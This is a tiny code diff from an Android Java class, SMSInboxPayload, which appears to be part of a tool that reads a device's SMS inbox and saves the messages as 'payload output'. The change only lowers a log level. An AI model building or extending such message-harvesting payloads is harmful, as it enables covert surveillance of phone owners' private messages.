@@ -32,7 +32,7 @@ public class SMSInboxPayload extends Payload {
 			}
 		} while (cursor.moveToNext());
 		if (save(msgData))
-			Log.i(tag, "Sms inbox saved successful");
+			Log.d(tag, "Sms inbox saved successful");
 		else
 			Log.e(tag, "Error while saving the payload output.");
 	}
